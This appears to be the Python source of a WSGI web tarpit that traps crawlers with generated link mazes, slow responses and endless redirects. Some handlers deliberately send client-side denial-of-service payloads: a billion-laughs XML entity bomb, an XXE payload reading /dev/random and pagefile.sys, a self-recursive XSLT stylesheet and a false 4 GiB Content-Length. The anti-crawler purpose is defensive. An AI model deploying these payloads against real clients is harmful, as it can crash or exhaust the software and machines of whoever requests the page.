#!/usr/bin/env python

import random
from zlib import adler32
from ConfigParser import SafeConfigParser, NoOptionError
from bisect import bisect_right
import pickle
import time
import urllib
import os
#import sys #stderr

from genmarkov import MarkovBuilder, TagState, MarkovChain

class Tarpyt(object):
    def __init__(self, config=None):
        self.builder = None
        self.www_dir = None
        conf = SafeConfigParser()
        if config:
            if hasattr(config, 'readline'):
                conf.readfp(config)
            else:
                conf.read(config)
        if conf.has_section('tarpyt'):
            try:
                mkvfile = conf.get('tarpyt','markov_file')
                mfile = open(mkvfile, 'rb')
                self.set_builder(pickle.load(mfile))
            except NoOptionError:
                self.builder = None
            try:
                www = conf.get('tarpyt', 'www_dir')
                self.www_dir = os.path.abspath(www) if os.path.isdir(www) else None
            except NoOptionError:
                self.www_dir = None
        self.weight_total = 0
        self.responses = []
        if conf.has_section('responses'):
            def update(response):
                self.responses.append(
                        getattr(self, 'response_' + response[0]) )
                self.weight_total += int(response[1])
                return self.weight_total
            self.weights = map(update,
                sorted( conf.items('responses'), key=lambda x: int(x[1]) ))
        else:
            self.responses.append(self.response_linkpage)
            self.weights = [1]
            self.weight_total = 1

    def getresponse(self, key):
        index = adler32(key) % self.weight_total
        i = bisect_right(self.weights, index)
        r = self.responses[i]
        return self.responses[bisect_right(self.weights, index)]

    def getlink(self, path='/'):
        next_path = path.rstrip('/') + '/{0}'
        return next_path.format(chr(random.randint(0x61,0x7A)))

    def set_builder(self, builder):
        self.builder = builder
        def getlink(path='/'):
            pathlist = ['^']
            pathlist.extend(filter(lambda x: x, path.split('/')))
            elem = self.builder.uripaths.get(pathlist[-1])
            if elem == '$':
                elem = self.builder.uripaths.get(None)
            return '/'+'/'.join(pathlist[1:]+[elem])
        self.getlink = getlink

    def response_slow(self, environ, start_response):
        """ Category: tarpit
        Returns an html page, but very slowly
        """
        content = None
        if self.builder:
            content = self.builder.generate(generate_links=True)
        else:
            content = u"A" * 4096
        status = '200 OK'
        headers = [('Content-Length',str(len(content)))]
        start_response(status, headers)
        for char in content.encode('utf-8'):
            yield char
            time.sleep(1)

    def response_linkpage(self, environ, start_response):
        """ Category: tarpit
        Returns an html page full of links
        """
        response_body = None
        if self.builder:
            response_body = self.builder.generate(generate_links=True)
        else:
            page_string = "<html><head><title>Welcome to the Labyrinth</title></head><body><ul>{0}</ul></body></html>"
            link_string = '<li><a href="{0}">{0}</a></li>'
            links = []
            prev_href = ''
            for n in range(0,5):
                href = self.getlink(os.path.normpath(environ['SCRIPT_NAME']+'/'+environ['PATH_INFO']))
                links.append(link_string.format(href))
            response_body = page_string.format(''.join(links))
        status = '200 OK'
        start_response(status, [])
        if isinstance(response_body, unicode):
            response_body = response_body.encode('utf-8')
        return [response_body]

    def response_redirect(self, environ, start_response):
        """ Category: realism
        Redirects to a random page
        """
        status = '302 Found'
        location = self.getlink(environ['SCRIPT_NAME'])
        if isinstance(location, unicode):
            location = urllib.quote(location.encode('utf-8'))
        headers = [('Location', location)]
        start_response(status, headers)
        return ""

    def response_inf_redirect(self, environ, start_response):
        """ Category: tarpit
        Returns a 302 redirect to a page which has the same modulus as the
        one requested, resulting in an infinite redirect. Loops eventually.
        If a suitable redirect cannot be made, falls back to appending a
        random path element to the path requested.
        """
        newpath = environ['PATH_INFO']
        modulus = self.weight_total
        tmp = 0
        chord = 0
        pos = len(newpath) - 1
        while pos > 0:
            chord = ord(newpath[pos])
            tmp = chord + modulus
            while tmp != chord:
                if tmp > ord('z'):
                    tmp %= modulus
                if (tmp >= 0x30 and tmp <= 0x39) \
                        or (tmp >= 0x41 and tmp <= 0x5A) \
                        or (tmp >= 0x61 and tmp <= 0x7A):
                            break
                tmp += modulus
            if tmp == chord:
                pos -= 1
            else:
                break
        if pos != 0:
            newpath = newpath[:pos] + chr(tmp) + newpath[pos+1:]
        else:
            newpath = self.getlink(newpath)
        status = '302 Found'
        if isinstance(newpath, unicode):
            newpath = urllib.quote(newpath.encode('utf-8'))
        headers = [('Location', os.path.normpath(environ['SCRIPT_NAME']+'/'+newpath))]
        start_response(status, headers)
        return ""

    def response_oversize(self, environ, start_response):
        """ Category: attack
        Sends an oversized Content-Length header. Some web servers have had
        Denial of Service vulnerabilities due to preallocating memory or disk
        (e.g. https://secunia.com/advisories/35645). Some spiders may have
        similar vulns (See, e.g., feature request for wget: 
        https://lists.gnu.org/archive/html/bug-wget/2012-01/msg00054.html)
        """
        status = '200 OK'
        headers = [('Content-Length', str(4 * 2**30))]
        start_response(status, headers)
        return ["",""] #Prevent WSGI from calculating content-length

    def response_entity_dos(self, environ, start_response):
        """ Category: attack
        Sends a malicious XML document that triggers a denial of service through
        entity expansions.
        
        Reference: CWE-776 (http://cwe.mitre.org/data/definitions/776.html)
        """
        status = '200 OK'
        headers = [('Content-type', 'application/xml')]
        start_response(status, headers)
        return """<?xml version="1.0"?>
        <!DOCTYPE spaml [
        <!ENTITY a "spam">
        <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
        <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
        <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
        <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
        <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
        <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
        <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
        <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
        <!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">
        <!ENTITY spam "&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;">
        ]>
        <spaml>&spam;<spaml>
        """

    def response_xxe_dos(self, environ, start_response):
        """ Category: attack
        Sends a malicious XML document that triggers a denial of service through
        Xml eXternal Entity references. Works best against *nix by reading from
        devices that never close. On Windows, currently tries to read
        pagefile.sys and access a probably-nonexistent server via UNC path. See
        http://archive.cert.uni-stuttgart.de/bugtraq/2002/10/msg00421.html
        """
        status = '200 OK'
        headers = [('Content-type', 'application/xml')]
        start_response(status, headers)
        return """<?xml version="1.0"?>
        <!DOCTYPE xxe [
        <!ENTITY r SYSTEM "file:///dev/random">
        <!ENTITY p SYSTEM "file://C:/pagefile.sys">
        <!ENTITY u SYSTEM "file:////foo/C$/pagefile.sys">
        ]>
        <xxe>&r;&p;&u;</xxe>
        """

    def response_xslt_recurse(self, environ, start_response):
        """ Category: attack
        Sends an XSL stylesheet containing an infinite recursion. The
        stylesheet, itself XML, references itself as its own stylesheet to begin
        the transform process, and the root template calls itself.
        """
        status = '200 OK'
        headers = [('Content-type', 'application/xml')]
        start_response(status, headers)
        return """<?xml version="1.0"?>
        <?xml-stylesheet type="text/xsl" href="{0}"?>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
            <xsl:template match="/">
                <blink>SPAM</blink>
                <xsl:apply-templates select="/" />
            </xsl:template>
        </xsl:stylesheet>
        """.format(os.path.normpath(environ['SCRIPT_NAME']+'/'+environ['PATH_INFO']))

    def application(self, environ, start_response):
        verb = environ['REQUEST_METHOD']
        path = os.path.normpath('/'+environ['PATH_INFO'])
        if self.www_dir:
            filepath = os.path.normpath( os.path.sep.join((self.www_dir, path)) )
            if filepath.startswith(self.www_dir):
                try:
                    serve = open(filepath, 'rb')
                    body = [serve.read()]
                    start_response('200 OK', [])
                    return body
                except Exception as e:
                    pass
        return self.getresponse(verb + path)(environ, start_response)

